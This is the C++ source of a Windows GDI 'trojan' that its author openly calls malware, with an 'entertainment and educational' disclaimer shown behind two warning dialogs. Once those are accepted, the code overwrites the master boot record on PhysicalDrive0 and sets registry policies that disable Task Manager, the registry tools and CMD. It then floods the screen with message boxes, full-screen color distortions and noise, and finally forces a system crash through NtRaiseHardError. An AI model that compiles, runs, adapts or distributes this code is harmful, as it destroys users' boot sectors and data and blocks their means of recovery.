﻿#include <windows.h>
#include <tchar.h>
#include <ctime>
#include <iostream>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#include "DisableFunction.h"
#include "bootheader.h"
#define M_PI   3.14159265358979323846264338327950288
#include "Hardshutdown.h"
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, *PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
if (red != length) {
red < length; red++;
if (ifblue == true) {
return RGB(red, 0, length);
}
else {
return RGB(red, 0, 0);
}
}
else {
if (green != length) {
green < length; green++;
return RGB(length, green, 0);
}
else {
if (blue != length) {
blue < length; blue++;
return RGB(0, length, blue);
}
else {
red = 0; green = 0; blue = 0;
ifblue = true;
}
}
}
}
COLORREF RndRGB() {
int clr = rand() % 5;
if (clr == 0) return RGB(255, 0, 0); if (clr == 1) return RGB(0, 255, 0); if (clr == 2) return RGB(0, 0, 255); if (clr == 3) return RGB(255, 0, 255); if (clr == 4) return RGB(255, 255, 0);
}

DWORD WINAPI msg(LPVOID lpParam) {
	while (1) {
		MessageBox(NULL, L"You Are Expendable, You Are Not Expected To Return...", L"No Returning...", MB_ICONERROR);
	}
	return 0;
}

DWORD WINAPI msg2(LPVOID lpParam) {
	while (1) {
		MessageBox(NULL, L"TAKE ME BACK!!!!!!!!!!!!!!!!!!!!!", L"Let Me Return!!!", MB_ICONERROR);
	}
	return 0;
}

DWORD WINAPI msg3(LPVOID lpParam) {
	while (1) {
		MessageBox(NULL, L"                             ", L"                          ", NULL);
	}
	return 0;
}

DWORD WINAPI shader1(LPVOID lpvd) //Red and White darken effect
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int fx = (x + i * 4) + (y + i * 4);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				// Lock hue to a red range (~0 to 0.1)
				hslcolor.h = 0.0f; // Keep it at red

								   // Control saturation and lightness for darker red/white
				hslcolor.s = (fx % 2 == 0) ? 0.7f : 0.1f; // Red and white variation
				hslcolor.l = (fx % 2 == 0) ? 0.3f : 0.7f; // Darker or lighter for red and white

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI shader2(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);

	// Initialize random seed
	srand(static_cast<unsigned int>(time(0)));

	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

		// Random conditions for color placement
		INT randXCondition = rand() % 50 + 1; // Random divisor for x condition
		INT randYCondition = rand() % 50 + 1; // Random divisor for y condition

		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;

			// Set the default background color to red
			rgbScreen[i].r = 255;
			rgbScreen[i].g = 0;
			rgbScreen[i].b = 0;

			// Apply blue color based on random conditions
			if (rand() % randXCondition == 0 && rand() % randYCondition == 0) {
				rgbScreen[i].r = 0;
				rgbScreen[i].g = 0;
				rgbScreen[i].b = 255;
			}
		}

		// Render the modified bitmap
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		Sleep(10);
		ReleaseDC(NULL, hdcScreen);
		DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader3(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);

	// Initialize random seed
	srand(static_cast<unsigned int>(time(0)));

	int offsetX = 0;
	float zoomFactor = 1.0f;
	int frameCount = 0;

	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

		// Increase the zoom factor over time for fast zoom-in effect
		zoomFactor += 0.005f + powf(frameCount / 300.0f, 2.0f) * 0.0005f; // Gradually speed up the zoom

																		  // Blue background moving horizontally
		offsetX = (offsetX + 2) % w;

		for (INT i = 0; i < w * h; i++) {
			// Calculate scaled coordinates to create zoom effect
			INT x = (i % w - w / 2) / zoomFactor + w / 2;
			INT y = (i / w - h / 2) / zoomFactor + h / 2;

			if (x < 0 || x >= w || y < 0 || y >= h) continue; // Avoid out-of-bound errors

															  // Set the moving blue background
			rgbScreen[i].r = 0;
			rgbScreen[i].g = 0;
			rgbScreen[i].b = 255 * ((x + offsetX) % w < w / 2 ? 1 : 0); // Alternating moving background

																		// XOR fractal split into two halves
			if (x < w / 2) { // Left half (red fractal)
				if ((x ^ y) % 20 < 10) {
					rgbScreen[i].r = 255;
					rgbScreen[i].g = 0;
					rgbScreen[i].b = 0;
				}
			}
			else { // Right half (cyan fractal)
				if ((x ^ y) % 20 < 10) {
					rgbScreen[i].r = 0;
					rgbScreen[i].g = 255;
					rgbScreen[i].b = 255;
				}
			}
		}

		// Render the modified bitmap
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		Sleep(10);
		frameCount++;
		ReleaseDC(NULL, hdcScreen);
		DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader4(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;

			int cx = x - (w / 2);
			int cy = y - (h / 2);

			int zx = (cx * cx);
			int zy = (cy * cy);

			int di = 128.0 + i;

			// Adjust the fx calculation to emphasize yellow
			int fx = di + (di * sin(sqrt(zx + zy) / 32.0));

			// Set color to yellow by emphasizing red and green, minimizing blue
			rgbScreen[i].r = min(255, GetRValue(fx + i) + 200);  // High red component
			rgbScreen[i].g = min(255, GetGValue(fx + i) + 200);  // High green component
			rgbScreen[i].b = min(50, GetBValue(fx + i));         // Low blue component

																 // Optional: You can control the intensity or mix yellow based on conditions
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader5(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				FLOAT fx = ((x + (10 * i)) ^ y) + (i + i * 10);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				// Adjust the hue for yellow and cyan combination
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * 0.10f, 1.f);

				// Force hue into the range of yellow (0.16-0.17) and cyan (0.5-0.55)
				if (hslcolor.h < 0.5f) {
					hslcolor.h = 0.16f + (hslcolor.h * (0.17f - 0.16f) / 0.5f); // Shift to yellow
				}
				else {
					hslcolor.h = 0.5f + ((hslcolor.h - 0.5f) * (0.55f - 0.5f) / 0.5f); // Shift to cyan
				}

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}

DWORD WINAPI shader6(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				FLOAT fx = ((x + (10 * i)) ^ y) + (i + i * 10);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				// Calculate brightness based on XOR pattern
				FLOAT brightness = fmod(fx / 400.f + y / screenHeight * 0.10f, 1.f);

				// Map brightness to gray scale values
				if (brightness < 0.33f) {
					hslcolor.l = 0.0f; // Black
				}
				else if (brightness < 0.67f) {
					hslcolor.l = 0.5f; // Gray
				}
				else {
					hslcolor.l = 1.0f; // White
				}

				hslcolor.h = 0.0f; // Hue is irrelevant for grayscale
				hslcolor.s = 0.0f; // Saturation is zero for grayscale

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}

DWORD WINAPI shader7(LPVOID lpParam) {
	HDC hdcScreen = GetDC(NULL);
	HDC hdcMem = CreateCompatibleDC(hdcScreen);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	BITMAPINFO bmi = { 0 };
	HBITMAP hbmTemp;
	RGBQUAD* rgbScreen = NULL;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biWidth = screenWidth;
	bmi.bmiHeader.biHeight = -screenHeight; // Negative height to ensure the bitmap is top-down
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;

	hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, 0);
	SelectObject(hdcMem, hbmTemp);

	int i = 0;
	while (1) {
		// Capture the screen into the memory DC
		BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

		for (int x = 0; x < screenWidth; x++) {
			for (int y = 0; y < screenHeight; y++) {
				int index = y * screenWidth + x;
				int fx = (x + i) ^ y;

				// Generate RGB colors based on the XOR pattern
				rgbScreen[index].rgbRed = (fx & 0xFF) ^ ((fx >> 8) & 0xFF);
				rgbScreen[index].rgbGreen = ((fx >> 16) & 0xFF) ^ (fx & 0xFF);
				rgbScreen[index].rgbBlue = ((fx >> 8) & 0xFF) ^ ((fx >> 16) & 0xFF);
			}
		}

		// Display the updated bitmap on the screen
		StretchBlt(hdcScreen, 0, 0, screenWidth, screenHeight, hdcMem, 0, 0, screenWidth, screenHeight, SRCCOPY);

		// Increment the position to create the scrolling effect
		i += 2; // Adjust the speed of the scrolling by changing this value

		Sleep(10); // Adjust the refresh rate by changing this value
	}

	ReleaseDC(NULL, hdcScreen);
	DeleteDC(hdcMem);
	DeleteObject(hbmTemp);

	return 0x00;
}

DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
	return 1;
}

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11050, 11050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast < char>(10 * (t ^ (t >> 10) & 5) | (t >> 5));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11050, 11050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast < char>(t * (t * (t >> 7 & t)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11050, 11050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast < char>(t & (t * (t >> 6)) | (((t & t) >> 9) * (t & (t >> 10) ^ 0xA)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
//t&t*(t>>7)
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11050, 11050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast <char>(t&t*(t >> 7));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11050, 11050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast <char>((t & t >> 8) * (t | t >> 5) + (t | t << 4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11050, 11050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast <char>((t ^ t >> 8) ^ (t ^ t >> 5) ^ (t ^ t << 4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI soundInf() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32050, 32050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32050 * 60] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast <char>(t * rand());

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

DWORD WINAPI cur1(LPVOID lpParam)//credits to N17Pro3426 for the radius
{
	POINT cursor;
	int centerX = 600;
	int centerY = 400;
	int radius = 400;
	float angle = 0;
	while (true)
	{
		HDC hdc = GetDC(0);
		int x = centerX + static_cast<int>(radius * cos(angle * M_PI / 180));
		int y = centerY + static_cast<int>(radius * sin(angle * M_PI / 180));
		//HBRUSH brush = CreateSolidBrush(Hue(239));
		//SelectObject(hdc, brush);
		GetCursorPos(&cursor);
		//RoundRect(hdc, x - 40, y - 40, x + 40, y + 40, x / 2, y / 2);
		SetCursorPos(x, y);
		int icon_x = GetSystemMetrics(SM_CXICON);
		int icon_y = GetSystemMetrics(SM_CYICON);
		DrawIcon(hdc, cursor.x - icon_x, cursor.y - icon_y, LoadIconW(0, IDI_WARNING));
		angle += 1;
		Sleep(10);
		//DeleteObject(brush);
		ReleaseDC(0, hdc);
	};
}


int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"You are about to run a GDI malware Which can damage your system This Malware was created for entertainment and Educational purposes Only.\nIf This Trojan is running on a real manchine, Please click No Otherwise if you run this Trojan on a virtual machine or you are sure that no data is at risk you can run it on this device.\n\nPLEASE NOTE THAT YOU RUN THE MALWARE AT YOUR OWN RISK AND I AM NOT RESPONSIBLE FOR ANY DAMAGES CAUSED BY THIS MALWARE!!!", L"WARNING! - floccinaucinihilipilification-2.0.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"ARE YOU SURE TO RUN THIS MALWARE ON THIS DEVICE!?\nALL YOUR DATA WILL BE DESTORYED AND YOU WILL NOT BE ABLE TO RETURN TO YOUR LOVELY SYSTEM AGAIN\n\nCLICK NO IF YOU DONT WANT TO DAMAGE YOUR LOVELY PC OR CLICK YES TO CONTINUE TO SEE WHAT I CAN DO!!!!!!!!", L"LAST WARNING!!!", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			CreateThread(0, 0, MBRWiper, 0, 0, 0);
			CreateThread(0, 0, notaskbar, 0, 0, 0);
			CreateThread(0, 0, kills, 0, 0, 0);
			Sleep(1000);
			CreateThread(0, 0, regdelete, 0, 0, 0);
			CreateThread(0, 0, msg, 0, 0, 0);
			reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
			Sleep(5000);
			CreateThread(0, 0, msg2, 0, 0, 0);
			Sleep(5000);
			CreateThread(0, 0, msg3, 0, 0, 0);
			Sleep(10000);
			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			HANDLE thread5 = CreateThread(0, 0, shader5, 0, 0, 0);
			CreateThread(0, 0, SendKeys, 0, 0, 0);
			CreateThread(0, 0, Click, 0, 0, 0);
			CreateThread(0, 0, MoveWindowFunc, 0, 0, 0);
			CreateThread(0, 0, Buttons, 0, 0, 0);
			CreateThread(0, 0, WindowText, 0, 0, 0);
			CreateThread(0, 0, Programs, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			HANDLE thread6 = CreateThread(0, 0, shader6, 0, 0, 0);
			sound5();
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			HANDLE thread7 = CreateThread(0, 0, shader7, 0, 0, 0);
			sound6();
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			//Enable all shader on final
			HANDLE thread9 = CreateThread(0, 0, shader1, 0, 0, 0);
			HANDLE thread10 = CreateThread(0, 0, shader2, 0, 0, 0);
			HANDLE thread12 = CreateThread(0, 0, shader3, 0, 0, 0);
			HANDLE thread13 = CreateThread(0, 0, shader4, 0, 0, 0);
			HANDLE thread14 = CreateThread(0, 0, shader5, 0, 0, 0);
			HANDLE thread114 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread17234682376523675236452 = CreateThread(0, 0, shader7, 0, 0, 0);
			soundInf();
			Sleep(60000);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xC0000145, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}